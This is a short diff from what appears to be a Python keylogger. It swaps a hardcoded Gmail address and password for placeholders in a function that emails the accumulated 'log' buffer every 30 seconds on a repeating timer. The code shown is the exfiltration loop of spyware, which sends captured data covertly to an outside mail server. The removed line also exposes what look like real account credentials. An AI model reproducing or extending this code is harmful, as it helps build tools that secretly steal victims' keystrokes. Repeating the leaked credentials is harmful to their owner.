@@ -22,7 +22,7 @@ def send_email(email,password,key):
     email_server.quit()
 def thread_function():
     global log
-    send_email("alihandurmus888@gmail.com", "159753+a", log.encode('utf-8'))
+    send_email("<youremail>", "<yourpassword>", log.encode('utf-8'))
     log = ""
     timer_object = threading.Timer(30,thread_function)
     timer_object.start()
